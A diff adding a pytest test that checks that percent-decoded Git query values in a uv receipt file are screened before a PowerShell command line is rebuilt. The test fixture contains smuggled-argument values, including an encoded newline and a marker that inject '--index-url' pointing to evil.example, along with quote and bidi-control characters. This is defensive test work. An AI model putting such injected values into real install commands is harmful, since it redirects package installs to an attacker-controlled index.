@@ -402,6 +402,27 @@ def test_review_rows_that_could_break_a_powershell_line_are_left_out(tmp_path, m
     assert dropped == ["u1", "m2", "m3", "g-nonascii", "m-bidi", "q-editable", "g-ref", "g-host", "g-subdir"]
 
 
+# #868 re-review: parse_qsl percent-decodes a Git row's ref and folder, so a check on the raw value misses `%22` (a `"`)
+# or `%E2%80%AE` (a bidi control) that would land in the rebuilt argument. The checks run on the rebuilt line.
+DECODED = """[tool]
+requirements = [
+    { name = "g", git = "https://h.example/r?rev=v1%22", marker = "os_name != ' --index-url=https://evil.example/simple '" },
+    { name = "g-bidi", git = "https://h.example/r?rev=v1%E2%80%AE" },
+    { name = "g-quote", git = "https://h.example/r?subdirectory=a%E2%80%99b" },
+    { name = "g-ctl", git = "https://h.example/r?tag=v1%0A--index-url=https://evil.example" },
+    { name = "g-fine", git = "https://h.example/r?rev=v1%2E2" },
+]
+"""
+
+
+def test_percent_decoded_git_query_values_are_checked_as_rebuilt(tmp_path, monkeypatch):
+    (tmp_path / "uv-receipt.toml").write_text(DECODED, encoding="utf-8")
+    monkeypatch.setattr(agentkit.sys, "prefix", str(tmp_path))
+    args, dropped = agentkit._receipt_with()
+    assert args == ["--with", "g-fine @ git+https://h.example/r@v1.2"]
+    assert dropped == ["g", "g-bidi", "g-quote", "g-ctl"]
+
+
 @pytest.mark.parametrize("quote", ["'", "\u2018", "\u2019", "\u201a", "\u201b"])
 def test_powershell_doubles_every_quote_it_reads_as_a_single_quote(quote):
     """PowerShell opens and closes a single-quoted string with any of these (#868 review): each is doubled inside."""
